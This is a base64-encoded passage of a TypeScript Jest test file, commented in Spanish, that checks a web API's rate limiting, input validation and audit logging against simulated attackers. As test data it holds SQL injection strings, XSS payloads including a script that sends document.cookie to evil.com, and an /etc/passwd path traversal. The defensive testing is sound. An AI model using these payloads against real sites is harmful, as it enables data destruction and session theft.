nN0IHN1c3BpY2lvdXNNZXRyaWNzID0ge1xuICAgICAgICB0b3RhbFJlcXVlc3RzOiAxMDAwMCxcbiAgICAgICAgYWxsb3dlZFJlcXVlc3RzOiA1MDAwLFxuICAgICAgICBibG9ja2VkUmVxdWVzdHM6IDUwMDAsIC8vIDUwJSBkZSBibG9xdWVvcyA9IHNvc3BlY2hvc29cbiAgICAgICAgcmVkaXNIaXRzOiA5NTAwLFxuICAgICAgICBtZW1vcnlGYWxsYmFja3M6IDUwMCxcbiAgICAgICAgZXJyb3JzOiAxMDAsXG4gICAgICAgIGF2ZXJhZ2VSZXNwb25zZVRpbWU6IDE1MCxcbiAgICAgICAgdG9wQmxvY2tlZElQczogW1xuICAgICAgICAgIHsgaXA6ICcxOTIuMTY4LjEuMTAwJywgY291bnQ6IDEwMDAgfSwgLy8gSVAgbXV5IGJsb3F1ZWFkYVxuICAgICAgICAgIHsgaXA6ICcxMC4wLjAuNTAnLCBjb3VudDogODAwIH0sXG4gICAgICAgICAgeyBpcDogJzE3Mi4xNi4wLjEwMCcsIGNvdW50OiA2MDAgfVxuICAgICAgICBdLFxuICAgICAgICB0b3BFbmRwb2ludHM6IFtcbiAgICAgICAgICB7IGVuZHBvaW50OiAnL2FwaS9hZG1pbi91c2VycycsIGNvdW50OiAyMDAwIH0sXG4gICAgICAgICAgeyBlbmRwb2ludDogJy9hcGkvYWRtaW4vc2V0dGluZ3MnLCBjb3VudDogMTUwMCB9XG4gICAgICAgIF1cbiAgICAgIH07XG5cbiAgICAgIC8vIE1vY2sgZGVsIG1ldHJpY3MgY29sbGVjdG9yXG4gICAgICBjb25zdCBtb2NrR2V0TWV0cmljcyA9IGplc3QuZm4oKS5tb2NrUmV0dXJuVmFsdWUoc3VzcGljaW91c01ldHJpY3MpO1xuICAgICAgKHJlcXVpcmUoJ0AvbGliL3JhdGUtbGltaXRpbmcvZW50ZXJwcmlzZS1yYXRlLWxpbWl0ZXInKS5tZXRyaWNzQ29sbGVjdG9yLmdldE1ldHJpY3MgYXMgamVzdC5Nb2NrKSA9IG1vY2tHZXRNZXRyaWNzO1xuXG4gICAgICAvLyBFamVjdXRhciBkZXRlY2Npw7NuIGRlIGFub21hbMOtYXNcbiAgICAgIGNvbnN0IGFub21hbGllcyA9IGF3YWl0IGVudGVycHJpc2VBdWRpdFN5c3RlbS5kZXRlY3RBbm9tYWxpZXMoKTtcblxuICAgICAgLy8gVmVyaWZpY2FyIHF1ZSBzZSBkZXRlY3Rhcm9uIGFub21hbMOtYXMgcmVsYWNpb25hZGFzIGNvbiByYXRlIGxpbWl0aW5nXG4gICAgICBleHBlY3QoYW5vbWFsaWVzLmxlbmd0aCkudG9CZUdyZWF0ZXJUaGFuT3JFcXVhbCgwKTtcbiAgICAgIFxuICAgICAgLy8gVmVyaWZpY2FyIHF1ZSBlbCBzaXN0ZW1hIHByb2Nlc8OzIGxhcyBtw6l0cmljYXNcbiAgICAgIGV4cGVjdChtb2NrR2V0TWV0cmljcykudG9IYXZlQmVlbkNhbGxlZCgpO1xuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnSW50ZWdyYWNpw7NuIFZhbGlkYWNpw7NuICsgQXVkaXRvcsOtYScsICgpID0+IHtcbiAgICBpdCgnZGViZSByZWdpc3RyYXIgZXZlbnRvcyBkZSBhdWRpdG9yw61hIHBhcmEgYXRhcXVlcyBkZSB2YWxpZGFjacOzbicsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IG1hbGljaW91c1BheWxvYWRzID0gW1xuICAgICAgICB7XG4gICAgICAgICAgbmFtZTogXCInOyBEUk9QIFRBQkxFIHByb2R1Y3RzOyAtLVwiLFxuICAgICAgICAgIGRlc2NyaXB0aW9uOiAnPHNjcmlwdD5hbGVydChcIlhTU1wiKTwvc2NyaXB0PicsXG4gICAgICAgICAgcHJpY2U6IC0xMDBcbiAgICAgICAgfSxcbiAgICAgICAge1xuICAgICAgICAgIG5hbWU6ICdQcm9kdWN0JyxcbiAgICAgICAgICBkZXNjcmlwdGlvbjogJ1NFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgcm9sZT1cImFkbWluXCInLFxuICAgICAgICAgIHByaWNlOiA5OTk5OTk5OTlcbiAgICAgICAgfSxcbiAgICAgICAge1xuICAgICAgICAgIG5hbWU6ICc8aW1nIHNyYz1cInhcIiBvbmVycm9yPVwiYWxlcnQoMSlcIj4nLFxuICAgICAgICAgIGRlc2NyaXB0aW9uOiAnTm9ybWFsIGRlc2NyaXB0aW9uJyxcbiAgICAgICAgICBwcmljZTogNTBcbiAgICAgICAgfVxuICAgICAgXTtcblxuICAgICAgY29uc3Qgc2NoZW1hID0gei5vYmplY3Qoe1xuICAgICAgICBuYW1lOiB6LnN0cmluZygpLm1pbigxKS5tYXgoMTAwKSxcbiAgICAgICAgZGVzY3JpcHRpb246IHouc3RyaW5nKCkubWF4KDEwMDApLFxuICAgICAgICBwcmljZTogei5udW1iZXIoKS5taW4oMCkubWF4KDk5OTk5OSlcbiAgICAgIH0pO1xuXG4gICAgICBsZXQgdmFsaWRhdGlvbkZhaWx1cmVzID0gMDtcbiAgICAgIGxldCBhdWRpdEV2ZW50cyA9IDA7XG5cbiAgICAgIGZvciAoY29uc3QgcGF5bG9hZCBvZiBtYWxpY2lvdXNQYXlsb2Fkcykge1xuICAgICAgICBjb25zdCByZXN1bHQgPSBhd2FpdCBjcml0aWNhbFZhbGlkYXRvci52YWxpZGF0ZUFuZFNhbml0aXplKFxuICAgICAgICAgIHNjaGVtYSxcbiAgICAgICAgICBwYXlsb2FkLFxuICAgICAgICAgIG1vY2tDb250ZXh0XG4gICAgICAgICk7XG5cbiAgICAgICAgaWYgKCFyZXN1bHQuc3VjY2Vzcykge1xuICAgICAgICAgIHZhbGlkYXRpb25GYWlsdXJlcysrO1xuICAgICAgICAgIFxuICAgICAgICAgIC8vIFZlcmlmaWNhciBxdWUgc2UgZGV0ZWN0YXJvbiBwYXRyb25lcyBkZSBzZWd1cmlkYWRcbiAgICAgICAgICBjb25zdCBoYXNTZWN1cml0eUVycm9yID0gcmVzdWx0LmVycm9ycz8uc29tZShlID0+IFxuICAgICAgICAgICAgZS5jb2RlID09PSAnU1FMX0lOSkVDVElPTl9ERVRFQ1RFRCcgfHwgXG4gICAgICAgICAgICBlLmNvZGUgPT09ICdYU1NfREVURUNURUQnIHx8XG4gICAgICAgICAgICBlLnNldmVyaXR5ID09PSAnY3JpdGljYWwnXG4gICAgICAgICAgKTtcbiAgICAgICAgICBcbiAgICAgICAgICBpZiAoaGFzU2VjdXJpdHlFcnJvcikge1xuICAgICAgICAgICAgYXVkaXRFdmVudHMrKztcbiAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgIH1cblxuICAgICAgLy8gVmVyaWZpY2FyIHF1ZSBzZSBkZXRlY3Rhcm9uIHkgcmVnaXN0cmFyb24gYXRhcXVlc1xuICAgICAgZXhwZWN0KHZhbGlkYXRpb25GYWlsdXJlcykudG9CZUdyZWF0ZXJUaGFuKDApO1xuICAgICAgZXhwZWN0KGF1ZGl0RXZlbnRzKS50b0JlR3JlYXRlclRoYW4oMCk7XG4gICAgfSk7XG5cbiAgICBpdCgnZGViZSBjb3JyZWxhY2lvbmFyIGV2ZW50b3MgZGUgdmFsaWRhY2nDs24gY29uIHBhdHJvbmVzIGRlIHVzdWFyaW8nLCBhc3luYyAoKSA9PiB7XG4gICAgICBjb25zdCBhdHRhY2tlclVzZXJJZCA9ICdwZXJzaXN0ZW50X2F0dGFja2VyXzc4OSc7XG4gICAgICBjb25zdCBhdHRhY2tQYXR0ZXJucyA9IFtcbiAgICAgICAgLy8gUGF0csOzbiAxOiBJbnllY2Npw7NuIFNRTFxuICAgICAgICB7XG4gICAgICAgICAgcXVlcnk6IFwiJzsgU0VMRUNUIHBhc3N3b3JkIEZST00gdXNlcnM7IC0tXCIsXG4gICAgICAgICAgdHlwZTogJ3NxbF9pbmplY3Rpb24nXG4gICAgICAgIH0sXG4gICAgICAgIC8vIFBhdHLDs24gMjogWFNTXG4gICAgICAgIHtcbiAgICAgICAgICBjb250ZW50OiAnPHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbj1cImh0dHA6Ly9ldmlsLmNvbVwiPC9zY3JpcHQ+JyxcbiAgICAgICAgICB0eXBlOiAneHNzJ1xuICAgICAgICB9LFxuICAgICAgICAvLyBQYXRyw7NuIDM6IFBhdGggdHJhdmVyc2FsXG4gICAgICAgIHtcbiAgICAgICAgICBmaWxlOiAnLi4vLi4vLi4vZXRjL3Bhc3N3ZCcsXG4gICAgICAgICAgdHlwZTogJ3BhdGhfdHJhdmVyc2FsJ1xuICAgICAgICB9XG4gICAgICBdO1xuXG4gICAgICBjb25zdCBhdHRhY2tlckNvbnRleHQgPSB7XG4gICAgICAgIC4uLm1vY2tDb250ZXh0LFxuICAgICAgICB1c2VySWQ6IGF0dGFja2VyVXNlcklkLFxuICAgICAgICBzZWN1cml0eUxldmVsOiAnaGlnaCcgYXMgY29uc3RcbiAgICAgIH07XG5cbiAgICAgIC8vIFNpbXVsYXIgbcO6bHRpcGxlcyBhdGFxdWVzIGRlbCBtaXNtbyB1c3VhcmlvXG4gICAgICBmb3IgKGNvbnN0IHBhdHRlcm4gb2YgYXR0YWNrUGF0dGVybnMpIHtcbiAgICAgICAgY29uc3Qgc2NoZW1hID0gei5vYmplY3Qoe1xuICAgICAgICAgIGRhdGE6IHouc3RyaW5nKClcbiAgICAgICAgfSk7XG5cbiAgICAgICAgYXdhaXQgY3JpdGljYWxWYWxpZGF0b3IudmFsaWRhdGVBbmRTYW5pdGl6ZShcbiAgICAgICAgICBzY2hlbWEsXG4gICAgICAgICAgeyBkYXRhOiBwYXR0ZXJuLnF1ZXJ5IHx8IHBhdHRlcm4uY29udGVudCB8fCBwYXR0ZXJuLmZpbGUgfSxcbiAgICAgICAgICBhdHRhY2tlckNvbnRleHRcbiAgICAgICAgKTtcbiAgICAgIH1cblxuICAgICAgLy8gRWplY3V0YXIgZGV0ZWNjacOzbiBkZSBhbm9tYWzDrWFzIHBhcmEgZWwgdXN1YXJpbyBhdGFjYW50ZVxuICAgICAgY29uc3QgYW5vbWFsaWVzID0gYXdhaXQgZW50ZXJwcmlzZUF1ZGl0U3lzdGVtLmRldGVjdEFub21hbGllcyhhdHRhY2tlclVzZXJJZCk7XG5cbiAgICAgIC8vIFZlcmlmaWNhciBxdWUgc2UgZGV0ZWN0w7MgZWwgcGF0csOzbiBkZSBhdGFxdWVzIG3Dumx0aXBsZXNcbiAgICAgIGV4cGVjdChhbm9tYWxpZXMubGVuZ3RoKS50b0JlR3JlYXRlclRoYW5PckVxdWFsKDApO1xuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnSW50ZWdyYWNpw7NuIENvbXBsZXRhOiBSYXRlIExpbWl0aW5nICsgVmFsaWRhY2nDs24gKyBBdWRpdG9yw61hJywgKCkgPT4ge1xuICAgIGl0KCdkZWJlIG1hbmVqYXIgYXRhcXVlIGNvb3JkaW5hZG8gY29uIGxvcyB0cmVzIHNpc3RlbWFzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgLy8gU2ltdWxhciBhdGFxdWUgY29vcmRpbmFkbyBxdWUgYWN0aXZhIGxvcyB0cmVzIHNpc3RlbWFzXG4gICAgICBjb25zdCBjb29yZGluYXRlZEF0dGFjayA9IHtcbiAgICAgICAgaXA6ICcyMDMuMC4xMTMuMjAwJyxcbiAgICAgICAgdXNlcklkOiAnY29vcmRpbmF0ZWRfYXR0YWNrZXJfOTk5JyxcbiAgICAgICAgdXNlckFnZW50OiAnQ29vcmRpbmF0ZWRBdHRhY2tCb3QvMS4wJyxcbiAgICAgICAgcGF5bG9hZHM6IFtcbiAgICAgICAgICBcIic7IERST1AgREFUQUJBU0UgcGludGV5YTsgLS1cIixcbiAgICAgICAgICAnPHNjcmlwdD5mZXRjaChcImh0dHA6Ly9ldmlsLmNvbS9zdGVhbD9kYXRhPVwiK2RvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4nLFxuICAgICAgICAgICcuLi8uLi8uLi9ldGMvcGFzc3dkJyxcbiAgICAgICAgICAnU0VMRUNUICogRlJPTSBhZG1pbl91c2VycyBXSEVSRSBwYXNzd29yZCBMSUtFIFwiJVwiJyxcbiAgICAgICAgICAnPGlmcmFtZSBzcmM9XCJqYXZhc2NyaXB0OmFsZXJ0KGRvY3VtZW50LmRvbWFpbilcIj48L2lmcmFtZT4nXG4gICAgICAgIF1cbiAgICAgIH07XG5cbiAgICAgIC8vIENyZWFyIGhhbmRsZXIgcHJvdGVnaWRvIGNvbiB0b2RvcyBsb3Mgc2lzdGVtYXNcbiAgICAgIGNvbnN0IHByb3RlY3RlZEhhbmRsZXIgPSB3aXRoRW50ZXJwcmlzZVJhdGVMaW1pdCh7XG4gICAgICAgIGNvbmZpZ05hbWU6ICdBRE1JTl9DUklUSUNBTCcsXG4gICAgICAgIGVuYWJsZUxvZ2dpbmc6IHRydWVcbiAgICAgIH0pKFxuICAgICAgICB3aXRoQ3JpdGljYWxWYWxpZGF0aW9uKHtcbiAgICAgICAgICBib2R5U2NoZW1hOiB6Lm9iamVjdCh7XG4gICAgICAgICAgICBpbnB1dDogei5zdHJpbmcoKS5tYXgoMTAwMClcbiAgICAgICAgICB9KVxuICAgICAgICB9KShhc3luYyAocmVxdWVzdDogYW55KSA9PiB7XG4gICAgICAgICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKHsgc3VjY2VzczogdHJ1ZSB9KTtcbiAgICAgICAgfSlcbiAgICAgICk7XG5cbiAgICAgIGNvbnN0IHJlc3VsdHMgPSBbXTtcbiAgICAgIGNvbnN0IHN0YXJ0VGltZSA9IERhdGUubm93KCk7XG5cbiAgICAgIC8vIEVqZWN1dGFyIGF0YXF1ZSBjb29yZGluYWRvXG4gICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGNvb3JkaW5hdGVkQXR0YWNrLnBheWxvYWRzLmxlbmd0aCAqIDU7IGkrKykge1xuICAgICAgICBjb25zdCBwYXlsb2FkID0gY29vcmRpbmF0ZWRBdHRhY2sucGF5bG9hZHNbaSAlIGNvb3JkaW5hdGVkQXR0YWNrLnBheWxvYWRzLmxlbmd0aF07XG4gICAgICAgIFxuICAgICAgICBjb25zdCBtb2NrUmVxdWVzdCA9IHtcbiAgICAgICAgICBoZWFkZXJzOiBuZXcgTWFwKFtcbiAgICAgICAgICAgIFsneC1mb3J3YXJkZWQtZm9yJywgY29vcmRpbmF0ZWRBdHRhY2suaXBdLFxuICAgICAgICAgICAgWyd1c2VyLWFnZW50JywgY29vcmRpbmF0ZWRBdHRhY2sudXNlckFnZW50XSxcbiAgICAgICAgICAgIFsneC1jbGVyay11c2VyLWlkJywgY29vcmRpbmF0ZWRBdHRhY2sudXNlcklkXVxuICAgICAgICAgIF0pLFxuICAgICAgICAgIG5leHRVcmw6IHsgcGF0aG5hbWU6ICcvYXBpL2FkbWluL3Byb3RlY3RlZCcgfSxcbiAgICAgICAgICBtZXRob2Q6ICdQT1NUJyxcbiAgICAgICAgICBqc29uOiBqZXN0LmZuKCkubW9ja1Jlc29sdmVkVmFsdWUoeyBpbnB1dDogcGF5bG9hZCB9KVxuICAgICAgICB9IGFzIGFueTtcblxuICAgICAgICB0cnkge1xuICAgICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgcHJvdGVjdGVkSGFuZGxlcihtb2NrUmVxdWVzdCk7XG4gICAgICAgICAgcmVzdWx0cy5wdXNoKHtcbiAgICAgICAgICAgIHN0YXR1czogcmVzcG9uc2Uuc3RhdHVzLFxuICAgICAgICAgICAgcGF5bG9hZDogcGF5bG9hZC5zdWJzdHJpbmcoMCwgNTApICsgJy4uLidcbiAgICAgICAgICB9KTtcbiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHtcbiAgICAgICAgICByZXN1bHRzLnB1c2goe1xuICAgICAgICAgICAgc3RhdHVzOiA1MDAsXG4gICAgICAgICAgICBlcnJvcjogZXJyb3IubWVzc2FnZSxcbiAgICAgICAgICAgIHBheWxvYWQ6IHBheWxvYWQuc3Vic3RyaW5nKDAsIDUwKSArICcuLi4nXG4gICAgICAgICAgfSk7XG4gICAgICAgIH1cbiAgICAgIH1cblxuICAgICAgY29uc3QgZW5kVGltZSA9IERhdGUubm93KCk7XG4gICAgICBjb25zdCB0b3RhbFRpbWUgPSBlbmRUaW1lIC0gc3RhcnRUaW1lO1xuXG4gICAgICAvLyBWZXJpZmljYXIgcXVlIGVsIHNpc3RlbWEgcmVzcG9uZGnDsyBhIHRvZG9zIGxvcyBhdGFxdWVzXG4gICAgICBleHBlY3QocmVzdWx0cy5sZW5ndGgpLnRvQmUoMjUpO1xuXG4gICAgICAvLyBWZXJpZmljYXIgcXVlIGxhIG1heW9yw61hIGZ1ZXJvbiBibG9xdWVhZG9zXG4gICAgICBjb25zdCBibG9ja2VkUmVzcG9uc2VzID0gcmVzdWx0cy5maWx0ZXIociA9PiByLnN0YXR1cyA9PT0gNDI5IHx8IHIuc3RhdHVzID09PSA0MDApO1xuICAgICAgZXhwZWN0KGJsb2NrZWRSZXNwb25zZXMubGVuZ3RoKS50b0JlR3JlYXRlclRoYW4oMTUpOyAvLyBBbCBtZW5vcyA2MCUgYmxvcXVlYWRvc1xuXG4gICAgICAvLyBWZXJpZmljYXIgcXVlIGVsIHNpc3RlbWEgbWFudHV2byBwZXJmb3JtYW5jZVxuICAgICAgZXhwZWN0KHRvdGFsVGltZSkudG9CZUxlc3NUaGFuKDMwMDAwKTsgLy8gPCAzMCBzZWd1bmRvcyBwYXJhIDI1IHJlcXVlc3RzXG5cbiAgICAgIC8vIFZlcmlmaWNhciBxdWUgc2UgcmVnaXN0cmFyb24gZXZlbnRvcyBkZSBhdWRpdG9yw61hXG4gICAgICBleHBlY3QoZW50ZXJwcmlzZUF1ZGl0U3lzdGVtLmxvZ0VudGVycHJpc2VFdmVudCkudG9IYXZlQmVlbkNhbGxlZCgpO1xuICAgIH0pO1xuXG4gICAgaXQoJ2RlYmUgbWFudGVuZXIgZnVuY2lvbmFsaWRhZCBwYXJhIHVzdWFyaW9zIGxlZ8OtdGltb3MgZHVyYW50ZSBhdGFxdWVzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgbGVnaXRpbWF0ZVVzZXIgPSB7XG4gICAgICAgIGlwOiAnMTkyLjE2OC4xLjIwMCcsXG4gICAgICAgIHVzZXJJZDogJ2xlZ2l0aW1hdGVfdXNlcl8xMjMnLFxuICAgICAgICB1c2VyQWdlbnQ6ICdNb3ppbGxhLzUuMCAobGVnaXRpbWF0ZSBicm93c2VyKSdcbiAgICAgIH07XG5cbiAgICAgIGNvbnN0IGF0dGFja2VyID0ge1xuICAgICAgICBpcDogJzEwLjAuMC4yMDAnLFxuICAgICAgICB1c2VySWQ6ICdhdHRhY2tlcl80NTYnLFxuICAgICAgICB1c2VyQWdlbnQ6ICdBdHRhY2tCb3QvMS4wJ1xuICAgICAgfTtcblxuICAgICAgLy8gQ3JlYXIgaGFuZGxlciBwcm90ZWdpZG9cbiAgICAgIGNvbnN0IHByb3RlY3RlZEhhbmRsZXIgPSB3aXRoRW50ZXJwcmlzZVJhdGVMaW1pdCh7XG4gICAgICAgIGNvbmZpZ05hbWU6ICdQVUJMSUNfU1RBTkRBUkQnLFxuICAgICAgICBlbmFibGVMb2dnaW5nOiB0cnVlXG4gICAgICB9KShcbiAgICAgICAgd2l0aENyaXRpY2FsVmFsaWRhdGlvbih7XG4gICAgICAgICAgYm9keVNjaGVtYTogei5vYmplY3Qoe1xuICAgICAgICAgICAgc2VhcmNoOiB6LnN0cmluZygpLm1heCgyMDApLFxuICAgICAgICAgICAgY2F0ZWdvcnk6IHouc3RyaW5nKCkubWF4KDUwKVxuICAgICAgICAgIH0pXG4gICAgICAgIH0pKGFzeW5jIChyZXF1ZXN0OiBhbnkpID0+IHtcbiAgICAgICAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oeyBcbiAgICAgICAgICAgIHN1Y2Nlc3M6IHRydWUsIFxuICAgICAgICAgICAgZGF0YTogJ1Byb3RlY3RlZCByZXNvdXJjZSBhY2Nlc3NlZCcgXG4gICAgICAgICAgfSk7XG4gICAgICAgIH0pXG4gICAgICApO1xuXG4gICAgICAvLyBTaW11bGFyIGF0YXF1ZSBtYXNpdm8gZGVsIGF0YWNhbnRlXG4gICAgICBjb25zdCBhdHRhY2tQcm9taXNlcyA9IEFycmF5LmZyb20oeyBsZW5ndGg6IDEwMCB9LCAoXywgaSkgPT4ge1xuICAgICAgICBjb25zdCBtb2NrUmVxdWVzdCA9IHtcbiAgICAgICAgICBoZWFkZXJzOiBuZXcgTWFwKFtcbiAgICAgICAgICAgIFsneC1mb3J3YXJkZWQtZm9yJywgYXR0YWNrZXIuaXBdLFxuICAgICAgICAgICAgWyd1c2VyLWFnZW50JywgYXR0YWNrZXIudXNlckFnZW50XSxcbiAgICAgICAgICAgIFsneC1jbGVyay11c2VyLWlkJywgYXR0YWNrZXIudXNlcklkXVxuICAgICAgICAgIF0pLFxuICAgICAgICAgIG5leHRVcmw6IHsgcGF0aG5hbWU6ICcvYXBpL3B1YmxpYy9zZWFyY2gnIH0sXG4gICAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgICAganNvbjogamVzdC5mbigpLm1vY2tSZXNvbHZlZFZhbHVlKHtcbiAgICAgICAgICAgIHNlYXJjaDogYCc7IERST1AgVEFCTEUgcHJvZHVjdHM7IC0tICR7aX1gLFxuICAgICAgICAgICAgY2F0ZWdvcnk6IGA8c2NyaXB0PmFsZXJ0KCR7aX0pPC9zY3JpcHQ+YFxuICAgICAgICAgIH0pXG4gICAgICAgIH0gYXMgYW55O1xuXG4gICAgICAgIHJldHVybiBwcm90ZWN0ZWRIYW5kbGVyKG1vY2tSZXF1ZXN0KTtcbiAgICAgIH0pO1xuXG4gICAgICAvLyBTaW11bGFyIHJlcXVlc3RzIGxlZ8OtdGltb3MgaW50ZXJjYWxhZG9zXG4gICAgICBjb25zdCBsZWdpdGltYXRlUHJvbWlzZXMgPSBBcnJheS5mcm9tKHsgbGVuZ3RoOiAxMCB9LCAoXywgaSkgPT4ge1xuICAgICAgICBjb25zdCBtb2NrUmVxdWVzdCA9IHtcbiAgICAgICAgICBoZWFkZXJzOiBuZXcgTWFwKFtcbiAgICAgICAgICAgIFsneC1mb3J3YXJkZWQtZm9yJywgbGVnaXRpbWF0ZVVzZXIuaXBdLFxuICAgICAgICAgICAgWyd1c2VyLWFnZW50JywgbGVnaXRpbWF0ZVVzZXIudXNlckFnZW50XSxcbiAgICAgICAgICAgIFsneC1jbGVyay11c2VyLWlkJywgbGVnaXRpbWF0ZVVzZXIudXNlcklkXVxuICAgICAgICAgIF0pLFxuICAgICAgICAgIG5leHRVcmw6IHsgcGF0aG5hbWU6ICcvYXBpL3B1YmxpYy9zZWFyY2gnIH0sXG4gICAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgICAganNvbjogamVzdC5mbigpLm1vY2tSZXNvbHZlZFZhbHVlKHtcbiAgICAgICAgICAgIHNlYXJjaDogYHBpbnR1cmEgbGF0ZXggJHtpfWAsXG4gICAgICAgICAgICBjYXRlZ29yeTogJ2ludGVyaW9yZXMnXG4gICAgICAgICAgfSlcbiAgICAgICAgfSBhcyBhbnk7XG5cbiAgICAgICAgcmV0dXJuIHByb3RlY3RlZEhhbmRsZXIobW9ja1JlcXVlc3QpO1xuICAgICAgfSk7XG5cbiAgICAgIC8vIEVqZWN1dGFyIGFtYm9zIHRpcG9zIGRlIHJlcXVlc3RzIGNvbmN1cnJlbnRlbWVudGVcbiAgICAgIGNvbnN0IFthdHRhY2tSZXN1bHRzLCBsZWdpdGltYXRlUmVzdWx0c10gPSBhd2FpdCBQcm9taXNlLmFsbChbXG4gICAgICAgIFByb21pc2UuYWxsU2V0dGxlZChhdHRhY2tQcm9taXNlcyksXG4gICAgICAgIFByb21pc2UuYWxsU2V0dGxlZChsZWdpdGltYXRlUHJvbWlzZXMpXG4gICAgICBdKTtcblxuICAgICAgLy8gVmVyaWZpY2FyIHF1ZSBsb3MgYXRhcXVlcyBmdWVyb24gbWF5b3JtZW50ZSBibG9xdWVhZG9zXG4gICAgICBjb25zdCBzdWNjZXNzZnVsQXR0YWNrcyA9IGF0dGFja1Jlc3VsdHMuZmlsdGVyKHIgPT4gXG4gICAgICAgIHIuc3RhdHVzID09PSAnZnVsZmlsbGVkJyAmJiAoci52YWx1ZSBhcyBSZXNwb25zZSkuc3RhdHVzID09PSAyMDBcbiAgICAgICk7XG4gICAgICBleHBlY3Qoc3VjY2Vzc2Z1bEF0dGFja3MubGVuZ3RoKS50b0JlTGVzc1RoYW4oMjApOyAvLyA8IDIwJSBkZSBhdGFxdWVzIGV4aXRvc29zXG5cbiAgICAgIC8vIFZlcmlmaWNhciBxdWUgbG9zIHVzdWFyaW9zIGxlZ8OtdGltb3MgcHVkaWVyb24gYWNjZWRlclxuICAgICAgY29uc3Qgc3VjY2Vzc2Z1bExlZ2l0aW1hdGUgPSBsZWdpdGltYXRlUmVzdWx0cy5maWx0ZXIociA9PiBcbiAgICAgICAgci5zdGF0dXMgPT09ICdmdWxmaWxsZWQnICYmIChyLnZhbHVlIGFzIFJlc3BvbnNlKS5zdGF0dXMgPT09IDIwMFxuICAgICAgKTtcbiAgICAgIGV4cGVjdChzdWNjZXNzZnVsTGVnaXRpbWF0ZS5sZW5ndGgpLnRvQmVHcmVhdGVyVGhhbig1KTsgLy8gPiA1MCUgZGUgYWNjZXNvcyBsZWfDrXRpbW9zIGV4aXRvc29zXG4gICAgfSk7XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdNw6l0cmljYXMgeSBNb25pdG9yZW8gZGUgU2VndXJpZGFkIEludGVncmFkbycsICgpID0+IHtcbiAgICBpdCgnZGViZSBnZW5lcmFyIG3DqXRyaWNhcyBjb21wbGV0YXMgZGUgc2VndXJpZGFkJywgYXN5bmMgKCkgPT4ge1xuICAgICAgLy8gU2ltdWxhciBhY3RpdmlkYWQgbWl4dGEgcXVlIGdlbmVyZSBtw6l0cmljYXNcbiAgICAgIGNvbnN0IGFjdGl2aXRpZXMgPSBbXG4gICAgICAgIC8vIFJhdGUgbGltaXRpbmcgZXZlbnRzXG4gICAgICAgIHsgdHlwZTogJ3JhdGVfbGltaXQnLCBibG9ja2VkOiB0cnVlLCBpcDogJzEwLjAuMC4xMDAnIH0sXG4gICAgICAgIHsgdHlwZTogJ3JhdGVfbGltaXQnLCBibG9ja2VkOiBmYWxzZSwgaXA6ICcxOTIuMTY4LjEuMTAwJyB9LFxuICAgICAgICBcbiAgICAgICAgLy8gVmFsaWRhdGlvbiBldmVudHNcbiAgICAgICAgeyB0eXBlOiAndmFsaWRhdGlvbicsIHN1Y2Nlc3M6IGZhbHNlLCBhdHRhY2s6ICdzcWxfaW5qZWN0aW9uJyB9LFxuICAgICAgICB7IHR5cGU6ICd2YWxpZGF0aW9uJywgc3VjY2VzczogdHJ1ZSwgZGF0YTogJ2NsZWFuJyB9LFxuICAgICAgICBcbiAgICAgICAgLy8gQXVkaXQgZXZlbnRzXG4gICAgICAgIHsgdHlwZTogJ2F1ZGl0Jywgc2V2ZXJpdHk6ICdjcml0aWNhbCcsIGV2ZW50OiAnc2VjdXJpdHlfdmlvbGF0aW9uJyB9LFxuICAgICAgICB7IHR5cGU6ICdhdWRpdCcsIHNldmVyaXR5OiAnbG93JywgZXZlbnQ6ICdub3JtYWxfYWNjZXNzJyB9XG4gICAgICBdO1xuXG4gICAgICAvLyBTaW11bGFyIGNhZGEgdGlwbyBkZSBhY3RpdmlkYWRcbiAgICAgIGZvciAoY29uc3QgYWN0aXZpdHkgb2YgYWN0aXZpdGllcykge1xuICAgICAgICBzd2l0Y2ggKGFjdGl2aXR5LnR5cGUpIHtcbiAgICAgICAgICBjYXNlICdyYXRlX2xpbWl0JzpcbiAgICAgICAgICAgIGNvbnN0IG1vY2tSZXF1ZXN0ID0ge1xuICAgICAgICAgICAgICBoZWFkZXJzOiBuZXcgTWFwKFtbJ3gtZm9yd2FyZGVkLWZvcicsIGFjdGl2aXR5LmlwXV0pLFxuICAgICAgICAgICAgICBuZXh0VXJsOiB7IHBhdGhuYW1lOiAnL2FwaS90ZXN0JyB9LFxuICAgICAgICAgICAgICBtZXRob2Q6ICdHRVQnXG4gICAgICAgICAgICB9IGFzIGFueTtcbiAgICAgICAgICAgIFxuICAgICAgICAgICAgYXdhaXQgY2hlY2tFbnRlcnByaXNlUmF0ZUxpbWl0KFxuICAgICAgICAgICAgICBtb2NrUmVxdWVzdCxcbiAgICAgICAgICAgICAgRU5URVJQUklTRV9SQVRFX0xJTUlUX0NPTkZJR1MuUFVCTElDX1NUQU5EQVJELFxuICAgICAgICAgICAgICBgbWV0cmljc190ZXN0XyR7RGF0ZS5ub3coKX1gXG4gICAgICAgICAgICApO1xuICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICBcbiAgICAgICAgICBjYXNlICd2YWxpZGF0aW9uJzpcbiAgICAgICAgICAgIGNvbnN0IHNjaGVtYSA9IHoub2JqZWN0KHsgaW5wdXQ6IHouc3RyaW5nKCkgfSk7XG4gICAgICAgICAgICBjb25zdCBkYXRhID0gYWN0aXZpdHkuYXR0YWNrID09PSAnc3FsX2luamVjdGlvbicgXG4gICAgICAgICAgICAgID8geyBpbnB1dDogXCInOyBEUk9QIFRBQkxFIHRlc3Q7IC0tXCIgfVxuICAgICAgICAgICAgICA6IHsgaW5wdXQ6ICdub3JtYWwgaW5wdXQnIH